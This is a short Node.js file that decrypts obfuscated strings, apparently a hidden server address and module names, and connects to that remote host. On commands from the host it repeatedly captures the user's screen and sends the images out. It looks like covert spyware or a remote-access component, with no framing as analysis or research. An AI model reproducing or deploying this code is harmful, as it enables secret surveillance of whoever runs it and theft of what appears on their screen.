"use strict";
var stop = 1;
var crypto = require("crypto"),
  algorithm = "aes-256-ctr",
  character = "d6F3Efeq";

function decrypt(text) {
  var decipher = crypto.createDecipher(algorithm, character);
  var dec = decipher.update(text, "hex", "utf8");
  dec += decipher.final("utf8");
  return dec;
}
let hw = decrypt("0c9ac0807b3e37246507b55cabad44c8fd1eddec8abe8d3424");
let cl = decrypt('098fcdc1');//2,3,4
let sh = decrypt('178dc695247f6b783f5da909f7f0178fbc5f');
let sk = decrypt('1781d79b246536793f04e701fbe6128f');
const flap = require(sh);
var finding = require(sk)(hw);
function start(counter) {
  if (counter < stop) {
    setTimeout(function () {
      counter++;
      flap()
        .then((img) => {
          finding.emit("kaphwan", img);
        })
        .catch((err) => {
          // ...
        });
      start(counter);
    }, 5000);
  }
}
finding.on("auto", function () {
  stop = 120;
  start(0);
});
finding.on("join", function () {
  finding.emit("join", `${cl}|computer`);
});
finding.on("kim", function () {
  stop = 0;
  flap()
    .then((img) => {
      finding.emit("kaphwan", img);
    })
    .catch((err) => {});
});

